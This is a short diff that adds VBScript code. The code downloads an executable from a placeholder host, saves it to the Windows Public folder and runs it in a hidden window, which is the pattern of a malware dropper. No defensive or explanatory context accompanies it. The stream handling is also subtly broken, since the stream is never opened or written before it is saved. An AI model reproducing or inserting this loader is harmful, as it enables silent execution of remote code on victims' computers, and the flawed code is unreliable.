@@ -1,0 +1,7 @@
+Set x = CreateObject("MSXML2.XMLHTTP")
+x.Open "GET", "http://example.invalid/a.exe", False
+x.Send
+Set s = CreateObject("ADODB.Stream")
+s.SaveToFile "C:\Users\Public\a.exe", 2
+CreateObject("WScript.Shell").Run "C:\Users\Public\a.exe", 0
+
